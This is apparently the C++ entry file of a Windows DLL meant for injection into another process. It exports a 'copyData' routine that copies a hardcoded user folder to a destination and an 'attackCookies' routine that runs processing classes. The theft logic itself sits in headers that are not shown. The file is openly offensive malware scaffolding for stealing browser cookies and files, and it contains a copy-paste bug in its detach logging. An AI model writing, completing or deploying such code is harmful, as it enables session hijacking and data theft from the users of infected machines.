#include <iostream>
#include <Windows.h>
#include "cPreprocessing.h"
#include "cMidprocessing.h"
#include "cPostprocessing.h"

#include "sFileHelper.h"
#include "sConstants.h"


HINSTANCE g_Hmodule;
using namespace std;

extern "C" __declspec(dllexport) void copyData()
{
	try
	{
		//Pre-processing
		cPreprocessing preProcessing;
		preProcessing.process();

		//Midprocessing
		string strDirPath = R"(C:\Users\Avenash_2\Videos\Movies - Copy)";
		string strDestFolder = sConstants::PATH_DEST;
		sFileHelper::copyFolder(strDirPath, strDestFolder);

		//Post processing
		cPostprocessing postProcessing;
		postProcessing.process();

		//Exit thread and unload dll
		FreeLibraryAndExitThread(g_Hmodule, 0);
	}
	catch (exception e)
	{
		//Print error message
		cout << sConstants::STR_ERROR << e.what();

		//Exit thread and unload dll
		FreeLibraryAndExitThread(g_Hmodule, -1);
	}
	catch (...)
	{
		//Print error message
		cout << sConstants::STR_ERROR << "Unkown error";

		//Exit thread and unload dll
		FreeLibraryAndExitThread(g_Hmodule, -1);
	}
}

extern "C" __declspec(dllexport) void attackCookies()
{
	try
	{
		//Pre-processing
		cPreprocessing preProcessing;
		preProcessing.process();

		//Midprocessing
		cMidprocessing midProcessing;
		midProcessing.process();

		//Post processing
		cPostprocessing postProcessing;
		postProcessing.process();

		//Exit thread and unload dll
		FreeLibraryAndExitThread(g_Hmodule, 0);
	}
	catch (exception e)
	{
		//Print error message
		cout << sConstants::STR_ERROR << e.what();

		//Exit thread and unload dll
		FreeLibraryAndExitThread(g_Hmodule, -1);
	}
	catch (...)
	{
		//Print error message
		cout << sConstants::STR_ERROR << "Unkown error";

		//Exit thread and unload dll
		FreeLibraryAndExitThread(g_Hmodule, -1);
	}
}


BOOL WINAPI DllMain(__in  HINSTANCE hinstDLL, __in  DWORD fdwReason, __in  LPVOID lpvReserved)
{
	g_Hmodule = hinstDLL;
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		cout << "DLL_PROCESS_ATTACH" << endl;
		break;
	case DLL_THREAD_ATTACH:
		cout << "DLL_THREAD_ATTACH" << endl;
		break;
	case DLL_THREAD_DETACH:
		cout << "DLL_THREAD_ATTACH" << endl;
		break;
	case DLL_PROCESS_DETACH:
		cout << "DLL_PROCESS_DETACH" << endl;
		break;
	}
	return TRUE;
}
